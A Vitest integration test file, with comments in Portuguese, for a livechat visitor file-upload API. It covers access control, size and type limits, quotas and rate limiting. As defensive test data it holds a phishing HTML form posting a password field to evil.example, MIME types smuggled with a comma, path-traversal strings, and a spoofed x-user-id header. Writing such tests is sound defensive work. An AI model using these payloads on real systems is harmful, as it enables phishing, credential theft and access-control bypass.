import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import WebSocket from 'ws';
import { config } from '../src/config';
import { pool } from '../src/db/pool';
import { resetUploadSlots } from '../src/omnichannel/service';
import { widgetHtml } from '../src/omnichannel/widget';
import { admin, api, connectWs, newUser, raw, sleep, startServer, stopServer, urlOf, type Auth } from './helpers';

let A: Auth;
let agent: Auth;
let agentWs: ReturnType<typeof connectWs>;
const sockets: { close(): void }[] = [];

const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');

async function settings(s: Record<string, unknown>) {
  const r = await api('POST', 'settings', { settings: s }, A);
  expect(r.success).toBe(true);
}

let vseq = 0;
async function visitor() {
  const token = `upload-visitor-${++vseq}-${Math.random().toString(36).slice(2)}`;
  const r = await api('POST', 'livechat/visitor', { visitor: { token, name: `Cliente Arquivos ${vseq}`, email: `arquivos${vseq}@ex.com` } });
  expect(r.success).toBe(true);
  return { token, visitor: r.visitor };
}

async function startChat(token: string) {
  const room = await api('GET', 'livechat/room', { token });
  expect(room.success).toBe(true);
  expect((await api('POST', 'livechat/message', { token, rid: room.room._id, msg: 'Olá, vou mandar um arquivo' })).success).toBe(true);
  return room.room._id as string;
}

async function waitRoom(rid: string, pred: (r: any) => boolean) {
  for (let i = 0; i < 60; i++) {
    const r = await api('GET', 'livechat/room.info', { rid }, A);
    if (r.room && pred(r.room)) return r.room;
    await sleep(50);
  }
  throw new Error('estado da sala não chegou');
}

function visitorWs(token: string) {
  const ws = new WebSocket(urlOf(`/livechat/websocket?token=${token}`).replace('http', 'ws'));
  const events: any[] = [];
  ws.on('message', (d) => events.push(JSON.parse(String(d))));
  sockets.push(ws);
  return { events, open: new Promise((r) => ws.on('open', r)) };
}

async function upload(rid: string, token: string | null, file: { name: string; type: string; data: Buffer | string }, fields: Record<string, string> = {}) {
  const fd = new FormData();
  // Campos depois do arquivo: o servidor precisa aceitar qualquer ordem.
  fd.append('file', new Blob([typeof file.data === 'string' ? file.data : new Uint8Array(file.data)], { type: file.type }), file.name);
  for (const [k, v] of Object.entries(fields)) fd.append(k, v);
  const res = await fetch(urlOf(`/api/v1/livechat/upload/${rid}`), { method: 'POST', headers: token ? { 'x-visitor-token': token } : {}, body: fd });
  return { status: res.status, ...((await res.json()) as any) };
}

const png = (name = 'comprovante.png') => ({ name, type: 'image/png', data: PNG });

function storedFiles() {
  if (!fs.existsSync(config.uploadDir)) return 0;
  return fs.readdirSync(config.uploadDir, { recursive: true, withFileTypes: true }).filter((d) => d.isFile()).length;
}

async function roomFileRows(rid: string) {
  return (await pool.query('SELECT count(*)::int AS n FROM files WHERE room_id = $1', [rid])).rows[0].n as number;
}

beforeAll(async () => {
  await startServer();
  A = await admin();
  await settings({ Livechat_enabled: true, Livechat_Routing_Method: 'Load_Balancing' });
  agent = await newUser(A);
  expect((await api('POST', 'livechat/users/agent', { username: agent.username }, A)).success).toBe(true);
  agentWs = connectWs(agent);
  await agentWs.ready;
  sockets.push(agentWs);
  expect((await api('POST', 'livechat/agent.status', { status: 'available' }, agent)).status).toBe('available');
});
// Os testes enviam muitos arquivos do mesmo IP; o limite por minuto é testado à parte.
beforeEach(() => resetUploadSlots());
afterAll(async () => {
  for (const s of sockets) s.close();
  await stopServer();
});

describe('livechat: arquivos do visitante', () => {
  it('visitante envia arquivo e o agente recebe a mensagem com o anexo, em tempo real', async () => {
    const { token, visitor: v } = await visitor();
    const vws = visitorWs(token);
    await vws.open;
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open' && r.servedBy?._id === agent.userId);

    const r = await upload(rid, token, png(), { msg: 'segue o comprovante', description: 'pagamento de outubro' });
    expect(r.status).toBe(200);
    expect(r.success).toBe(true);
    const m = r.message;
    expect(m.rid).toBe(rid);
    expect(m.msg).toBe('segue o comprovante');
    expect(m.u._id).toBe(v._id);
    expect(m.visitorId).toBe(v._id);
    expect(m.token).toBeUndefined();
    expect(m.files).toEqual([{ _id: expect.any(String), name: 'comprovante.png', type: 'image/png', size: PNG.length }]);
    // Mesmo formato dos uploads de usuários, que o cliente web já sabe exibir.
    const att = m.attachments[0];
    expect(att).toMatchObject({ title: 'comprovante.png', type: 'file', size: PNG.length, format: 'PNG', description: 'pagamento de outubro' });
    expect(att.title_link).toBe(`/file-upload/${m.files[0]._id}/comprovante.png`);
    expect(att.image_url).toBe(att.title_link);

    const ev = await agentWs.waitFor((e) => e.type === 'message' && e.message._id === m._id);
    expect(ev.message.attachments[0].image_url).toBe(att.image_url);
    for (let i = 0; i < 40 && !vws.events.some((e) => e.type === 'message' && e.message._id === m._id); i++) await sleep(50);
    const toVisitor = vws.events.find((e) => e.type === 'message' && e.message._id === m._id);
    expect(toVisitor.message.attachments[0].title_link).toBe(att.title_link);
    expect(toVisitor.message.token).toBeUndefined();

    const hist = await api('GET', 'channels.history', { roomId: rid }, agent);
    expect(hist.messages.find((x: any) => x._id === m._id)?.attachments[0].title_link).toBe(att.title_link);
    const file = await raw(att.title_link, agent);
    expect(file.status).toBe(200);
    expect(file.headers.get('content-type')).toBe('image/png');
    expect(Buffer.from(await file.arrayBuffer()).equals(PNG)).toBe(true);
    const files = await api('GET', 'rooms.files', { roomId: rid }, agent);
    expect(files.files.map((f: any) => [f.name, f.user.username])).toEqual([['comprovante.png', v.username]]);

    // Sem texto: a prévia da sala mostra o arquivo e a conversa registra a mensagem do visitante.
    const before = (await pool.query('SELECT last_visitor_msg FROM livechat_rooms WHERE room_id = $1', [rid])).rows[0].last_visitor_msg;
    const doc = await upload(rid, token, { name: 'contrato.pdf', type: 'application/pdf', data: '%PDF-1.4 teste' });
    expect(doc.success).toBe(true);
    expect(doc.message.msg).toBe('');
    expect(doc.message.attachments[0].image_url).toBeUndefined();
    const room = (await pool.query('SELECT r.last_message, lr.last_visitor_msg FROM rooms r JOIN livechat_rooms lr ON lr.room_id = r.id WHERE r.id = $1', [rid])).rows[0];
    expect(room.last_message.msg).toBe('📎 contrato.pdf');
    expect(new Date(room.last_visitor_msg).getTime()).toBeGreaterThan(new Date(before).getTime());
    const sub = await api('GET', 'subscriptions.getOne', { roomId: rid }, agent);
    expect(sub.subscription.unread).toBeGreaterThanOrEqual(2);
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
  });

  it('cria a mensagem mesmo com a conversa ainda na fila', async () => {
    await settings({ Livechat_Routing_Method: 'Manual_Selection' });
    try {
      const { token } = await visitor();
      const rid = await startChat(token);
      await sleep(100);
      expect((await api('GET', 'livechat/room.info', { rid }, A)).room.status).toBe('queued');
      const r = await upload(rid, token, png('fila.png'));
      expect(r.success).toBe(true);
      const hist = await api('GET', `livechat/messages.history/${rid}`, { token });
      expect(hist.messages.some((m: any) => m.attachments?.[0]?.title === 'fila.png')).toBe(true);
      expect((await api('GET', 'livechat/room.info', { rid }, A)).room.status).toBe('queued');
      await api('POST', 'livechat/room.closeByUser', { rid }, A);
    } finally {
      await settings({ Livechat_Routing_Method: 'Load_Balancing' });
    }
  });

  it('recusa token inválido, sala de outro visitante, conversa encerrada e envio sem arquivo', async () => {
    const { token } = await visitor();
    const other = await visitor();
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    const files = storedFiles();

    const noToken = await upload(rid, null, png());
    expect(noToken.status).toBe(404);
    expect(noToken.errorType).toBe('error-invalid-token');
    expect((await upload(rid, 'token-que-nao-existe', png())).errorType).toBe('error-invalid-token');
    const foreign = await upload(rid, other.token, png());
    expect(foreign.status).toBe(404);
    expect(foreign.errorType).toBe('error-room-not-found');
    const fd = new FormData();
    fd.append('msg', 'sem arquivo');
    const empty = await fetch(urlOf(`/api/v1/livechat/upload/${rid}`), { method: 'POST', headers: { 'x-visitor-token': token }, body: fd });
    expect(empty.status).toBe(400);

    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
    const closed = await upload(rid, token, png());
    expect(closed.status).toBe(400);
    expect(closed.errorType).toBe('error-room-closed');
    expect(await roomFileRows(rid)).toBe(0);
    expect(storedFiles()).toBe(files);
  });

  it('respeita tamanho máximo, tipos permitidos e as configurações de upload', async () => {
    const { token } = await visitor();
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    const files = storedFiles();
    try {
      const cfg = (await api('GET', 'livechat/config')).config.settings;
      expect(cfg).toMatchObject({ fileUpload: true, fileUploadMaxSize: 104857600, fileUploadAcceptedTypes: [], fileUploadBlockedTypes: ['image/svg+xml'] });

      await settings({ FileUpload_MaxFileSize: 1024 });
      expect((await api('GET', 'livechat/config')).config.settings.fileUploadMaxSize).toBe(1024);
      const big = await upload(rid, token, { name: 'grande.txt', type: 'text/plain', data: 'x'.repeat(4096) });
      expect(big.status).toBe(400);
      expect(big.errorType).toBe('error-file-too-large');
      expect(big.error).toContain('1 KB');
      // Arquivo bem maior que o limite: a resposta ainda chega inteira, sem conexão derrubada.
      const huge = await upload(rid, token, { name: 'enorme.bin', type: 'application/octet-stream', data: Buffer.alloc(3 * 1024 * 1024, 1) });
      expect(huge.errorType).toBe('error-file-too-large');
      await settings({ FileUpload_MaxFileSize: 104857600 });

      const svg = await upload(rid, token, { name: 'logo.svg', type: 'image/svg+xml', data: '<svg xmlns="http://www.w3.org/2000/svg"/>' });
      expect(svg.status).toBe(400);
      expect(svg.errorType).toBe('error-invalid-file-type');
      await settings({ FileUpload_MediaTypeWhiteList: 'image/*, application/pdf' });
      expect((await api('GET', 'livechat/config')).config.settings.fileUploadAcceptedTypes).toEqual(['image/*', 'application/pdf']);
      expect((await upload(rid, token, { name: 'nota.txt', type: 'text/plain', data: 'oi' })).errorType).toBe('error-invalid-file-type');
      expect((await upload(rid, token, png('permitido.png'))).success).toBe(true);
      await settings({ FileUpload_MediaTypeWhiteList: '' });

      await settings({ Livechat_fileupload_enabled: false });
      expect((await api('GET', 'livechat/config')).config.settings.fileUpload).toBe(false);
      const off = await upload(rid, token, png());
      expect(off.status).toBe(403);
      expect(off.errorType).toBe('error-file-upload-disabled');
      await settings({ Livechat_fileupload_enabled: true, FileUpload_Enabled: false });
      expect((await api('GET', 'livechat/config')).config.settings.fileUpload).toBe(false);
      expect((await upload(rid, token, png())).errorType).toBe('error-file-upload-disabled');
      await settings({ FileUpload_Enabled: true });
      expect((await upload(rid, token, png('de-novo.png'))).success).toBe(true);
    } finally {
      await settings({ FileUpload_MaxFileSize: 104857600, FileUpload_MediaTypeWhiteList: '', Livechat_fileupload_enabled: true, FileUpload_Enabled: true });
    }
    // Só os dois envios aceitos ficaram gravados; os recusados não deixam lixo no disco.
    expect(await roomFileRows(rid)).toBe(2);
    expect(storedFiles()).toBe(files + 2);
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
  });

  it('visitante baixa pelo cabeçalho só os arquivos das próprias conversas', async () => {
    const { token } = await visitor();
    const other = await visitor();
    const vws = visitorWs(token);
    await vws.open;
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    const mine = (await upload(rid, token, png('minha-foto.png'))).message.attachments[0].title_link;

    // Arquivo do agente chega ao widget em tempo real e pode ser baixado pelo visitante.
    const fd = new FormData();
    fd.append('file', new Blob(['orçamento aprovado'], { type: 'text/plain' }), 'orcamento.txt');
    fd.append('description', 'versão final');
    const sent = await api('POST', `rooms.upload/${rid}`, fd, agent);
    expect(sent.success).toBe(true);
    const fromAgent = sent.message.attachments[0].title_link;
    expect(sent.message.attachments[0].description).toBe('versão final');
    for (let i = 0; i < 40 && !vws.events.some((e) => e.type === 'message' && e.message._id === sent.message._id); i++) await sleep(50);
    expect(vws.events.find((e) => e.type === 'message' && e.message._id === sent.message._id)?.message.attachments[0].title_link).toBe(fromAgent);

    const asVisitor = (url: string, t?: string) => fetch(urlOf(url), { headers: t ? { 'x-visitor-token': t } : {} });
    const own = await asVisitor(mine, token);
    expect(own.status).toBe(200);
    expect(Buffer.from(await own.arrayBuffer()).equals(PNG)).toBe(true);
    const agentFile = await asVisitor(fromAgent, token);
    expect(agentFile.status).toBe(200);
    expect(await agentFile.text()).toBe('orçamento aprovado');

    expect((await asVisitor(mine, other.token)).status).toBe(403);
    expect((await asVisitor(mine)).status).toBe(403);
    expect((await asVisitor(`${mine}?token=${token}`)).status).toBe(403);
    expect((await asVisitor(mine, 'token-que-nao-existe')).status).toBe(403);
    expect((await asVisitor(`/file-upload/naoexiste/x.png`, token)).status).toBe(404);

    // Arquivo de uma sala que não é do livechat.
    const g = await api('POST', 'groups.create', { name: 'arquivos-internos' }, A);
    const ifd = new FormData();
    ifd.append('file', new Blob(['interno'], { type: 'text/plain' }), 'interno.txt');
    const internal = (await api('POST', `rooms.upload/${g.group._id}`, ifd, A)).message.attachments[0].title_link;
    expect((await asVisitor(internal, token)).status).toBe(403);
    // O cabeçalho de visitante não atrapalha um usuário com acesso.
    const both = await fetch(urlOf(internal), { headers: { 'x-visitor-token': token, cookie: `rc_uid=${A.userId}; rc_token=${A.authToken}` } });
    expect(both.status).toBe(200);

    // Depois de encerrada, a conversa continua sendo do visitante.
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
    expect((await asVisitor(fromAgent, token)).status).toBe(200);
    const hist = await api('GET', `livechat/messages.history/${rid}`, { token });
    expect(hist.messages.filter((m: any) => m.attachments?.length).map((m: any) => m.attachments[0].title).sort()).toEqual(['minha-foto.png', 'orcamento.txt']);
  });

  it('remover o contato apaga os arquivos dele do disco', async () => {
    const { token, visitor: v } = await visitor();
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    const m = (await upload(rid, token, png('apagar.png'))).message;
    const row = (await pool.query('SELECT storage_path FROM files WHERE id = $1', [m.files[0]._id])).rows[0];
    const abs = path.join(config.uploadDir, row.storage_path);
    expect(fs.existsSync(abs)).toBe(true);
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
    expect((await api('DELETE', `livechat/visitors/${v._id}`, undefined, A)).success).toBe(true);
    expect(fs.existsSync(abs)).toBe(false);
    expect(await roomFileRows(rid)).toBe(0);
  });
});

describe('livechat: proteção dos arquivos do visitante', () => {
  const asVisitor = (url: string, t?: string) => fetch(urlOf(url), { headers: t ? { 'x-visitor-token': t } : {} });

  it('quem só sabe o e-mail do cliente não assume o contato nem baixa os arquivos dele', async () => {
    const victim = await visitor();
    const rid = await startChat(victim.token);
    await waitRoom(rid, (r) => r.status === 'open');
    const link = (await upload(rid, victim.token, png('contrato.png'))).message.attachments[0].title_link;
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);

    const attackerToken = `atacante-${Math.random().toString(36).slice(2)}`;
    const reg = await api('POST', 'livechat/visitor', { visitor: { token: attackerToken, email: victim.visitor.email.toUpperCase() } });
    expect(reg.success).toBe(true);
    // Contato novo, sem dados do outro (nem a última conversa, IP ou navegador).
    expect(reg.visitor._id).not.toBe(victim.visitor._id);
    expect(reg.visitor.lastChat).toBeUndefined();
    expect(reg.visitor.ip).toBeUndefined();
    expect(reg.visitor.userAgent).toBeUndefined();
    expect((await api('GET', `livechat/visitor/${victim.token}`)).visitor.lastChat).toBeUndefined();
    // O token original continua sendo do cliente.
    const victimRow = (await pool.query('SELECT token FROM livechat_visitors WHERE id = $1', [victim.visitor._id])).rows[0];
    expect(victimRow.token).toBe(victim.token);
    expect((await api('GET', `livechat/messages.history/${rid}`, { token: attackerToken })).status).toBe(404);
    expect((await asVisitor(link, attackerToken)).status).toBe(403);
    expect((await asVisitor(link, victim.token)).status).toBe(200);

    // Conversa encerrada há mais de um dia: nem o próprio visitante baixa mais os arquivos.
    await pool.query(`UPDATE livechat_rooms SET closed_at = now() - interval '25 hours' WHERE room_id = $1`, [rid]);
    expect((await asVisitor(link, victim.token)).status).toBe(403);
  });

  it('limita campos de texto do multipart (memória) e não grava nada quando passa do limite', async () => {
    const { token } = await visitor();
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    const files = storedFiles();
    const send = async (fd: FormData) => {
      const res = await fetch(urlOf(`/api/v1/livechat/upload/${rid}`), { method: 'POST', headers: { 'x-visitor-token': token }, body: fd });
      return { status: res.status, ...((await res.json()) as any) };
    };
    const many = new FormData();
    for (let i = 0; i < 50; i++) many.append(`campo${i}`, 'x'.repeat(1000));
    many.append('file', new Blob([new Uint8Array(PNG)], { type: 'image/png' }), 'depois.png');
    const tooMany = await send(many);
    expect(tooMany.status).toBe(413);
    expect(tooMany.errorType).toBe('error-too-many-parts');

    const big = new FormData();
    big.append('file', new Blob([new Uint8Array(PNG)], { type: 'image/png' }), 'antes.png');
    big.append('msg', 'x'.repeat(200 * 1024));
    const bigField = await send(big);
    expect(bigField.status).toBe(413);
    expect(bigField.errorType).toBe('error-field-too-large');

    // Campos desconhecidos são ignorados.
    const extra = new FormData();
    extra.append('file', new Blob([new Uint8Array(PNG)], { type: 'image/png' }), 'ok.png');
    extra.append('msg', 'com campo extra');
    extra.append('qualquer', 'coisa');
    const ok = await send(extra);
    expect(ok.success).toBe(true);
    expect(ok.message.msg).toBe('com campo extra');
    expect(await roomFileRows(rid)).toBe(1);
    expect(storedFiles()).toBe(files + 1);
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
  });

  it('tipo do arquivo é um único tipo/subtipo; nada vira HTML na origem do chat', async () => {
    const { token } = await visitor();
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    const html = '<h1>Sua sessão expirou</h1><form action="https://evil.example/x"><input name="senha"></form>';
    for (const type of ['image/png,text/html', 'image/png,image/svg+xml']) {
      const r = await upload(rid, token, { name: 'fatura.png', type, data: html });
      expect(r.success).toBe(true);
      expect(r.message.files[0].type).toBe('application/octet-stream');
      expect(r.message.attachments[0].image_url).toBeUndefined();
      const res = await asVisitor(r.message.attachments[0].title_link, token);
      expect(res.headers.get('content-type')).toBe('application/octet-stream');
      expect(res.headers.get('content-disposition')).toMatch(/^attachment;/);
      expect(res.headers.get('content-security-policy')).toContain('sandbox');
      expect(res.headers.get('content-security-policy')).toContain("form-action 'none'");
    }
    // Com lista de permitidos "image/*", o truque da vírgula também não passa como imagem.
    await settings({ FileUpload_MediaTypeWhiteList: 'image/*' });
    try {
      expect((await upload(rid, token, { name: 'fatura.png', type: 'image/png,text/html', data: html })).errorType).toBe('error-invalid-file-type');
    } finally {
      await settings({ FileUpload_MediaTypeWhiteList: '' });
    }
    // Arquivos antigos com tipo inválido gravado também saem como download.
    const r = await upload(rid, token, png('antigo.png'));
    await pool.query(`UPDATE files SET type = 'image/png,text/html' WHERE id = $1`, [r.message.files[0]._id]);
    const old = await asVisitor(r.message.attachments[0].title_link, token);
    expect(old.headers.get('content-type')).toBe('application/octet-stream');
    expect(old.headers.get('content-disposition')).toMatch(/^attachment;/);
    // Imagem de verdade continua abrindo na aba, com sandbox; PDF sem sandbox (o visualizador precisa de scripts).
    const img = await asVisitor((await upload(rid, token, png('foto.png'))).message.attachments[0].title_link, token);
    expect(img.headers.get('content-disposition')).toMatch(/^inline;/);
    expect(img.headers.get('content-security-policy')).toContain('sandbox');
    const pdf = await asVisitor((await upload(rid, token, { name: 'doc.pdf', type: 'application/pdf', data: '%PDF-1.4' })).message.attachments[0].title_link, token);
    expect(pdf.headers.get('content-disposition')).toMatch(/^inline;/);
    expect(pdf.headers.get('content-security-policy')).not.toContain('sandbox');
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
  });

  it('cota de espaço e limite de envios por minuto por visitante', async () => {
    const { token } = await visitor();
    const rid = await startChat(token);
    await waitRoom(rid, (r) => r.status === 'open');
    await settings({ Livechat_fileupload_max_total_size: PNG.length * 2 + 10 });
    try {
      expect((await upload(rid, token, png('1.png'))).success).toBe(true);
      expect((await upload(rid, token, png('2.png'))).success).toBe(true);
      const full = await upload(rid, token, png('3.png'));
      expect(full.status).toBe(413);
      expect(full.errorType).toBe('error-file-quota-exceeded');
      expect(await roomFileRows(rid)).toBe(2);
      // Cota com espaço sobrando, mas o arquivo não cabe: recusado depois de lido, sem deixar lixo.
      await settings({ Livechat_fileupload_max_total_size: PNG.length * 2 + 2048 });
      const files = storedFiles();
      expect((await upload(rid, token, { name: 'grande.bin', type: 'application/octet-stream', data: Buffer.alloc(4096, 1) })).errorType).toBe('error-file-quota-exceeded');
      expect(storedFiles()).toBe(files);
    } finally {
      await settings({ Livechat_fileupload_max_total_size: 209715200 });
    }
    resetUploadSlots();
    const results: number[] = [];
    for (let i = 0; i < 12; i++) results.push((await upload(rid, token, png(`rapido-${i}.png`))).status);
    expect(results.slice(0, 10).every((s) => s === 200)).toBe(true);
    expect(results.slice(10)).toEqual([429, 429]);
    await api('POST', 'livechat/room.closeByUser', { rid }, agent);
  });

  it('o limite global da API não é contornado com um x-user-id inventado', async () => {
    // Administrador à parte: o balde de requisições dele fica livre para desligar o limite no fim.
    const ops = await newUser(A, { roles: ['admin'] });
    const set = (s: Record<string, unknown>) => api('POST', 'settings', { settings: s }, ops);
    expect((await set({ API_Enable_Rate_Limiter: true, API_Enable_Rate_Limiter_Limit_Calls_Default: 20 })).success).toBe(true);
    try {
      const statuses: number[] = [];
      for (let i = 0; i < 25; i++) {
        const r = await fetch(urlOf('/api/v1/livechat/config'), { headers: { 'x-user-id': `inventado-${i}-${Math.random()}` } });
        statuses.push(r.status);
      }
      expect(statuses).toContain(429);
    } finally {
      expect((await set({ API_Enable_Rate_Limiter_Limit_Calls_Default: 300 })).success).toBe(true);
    }
  });

  it('widget só busca com o token caminhos /file-upload/<id>/<nome> que o navegador não reescreve', () => {
    const src = /function isFileUrl\(url\) \{[\s\S]*?\n  \}/.exec(widgetHtml())![0];
    const isFileUrl = vm.runInNewContext(`${src}; isFileUrl`, { URL, location: { href: 'http://chat.test/livechat', origin: 'http://chat.test' } });
    for (const ok of ['/file-upload/abc123/contrato.pdf', `/file-upload/abc/${encodeURIComponent("relatório (final) 2024!.pdf")}`]) expect(isFileUrl(ok)).toBe(true);
    for (const bad of [
      '/file-upload/abc/..\\..\\api\\v1\\livechat\\room',
      '/file-upload/abc/..',
      '/file-upload/abc/%2e%2e',
      '/file-upload/abc/.',
      '/file-upload/abc/x?token=1',
      '/file-upload/abc/x#y',
      '/file-upload/abc/a/b',
      '//evil.example/file-upload/abc/x',
      'https://evil.example/file-upload/abc/x',
      '/file-upload/abc/x y',
      null,
    ]) {
      expect(isFileUrl(bad)).toBe(false);
    }
  });
});
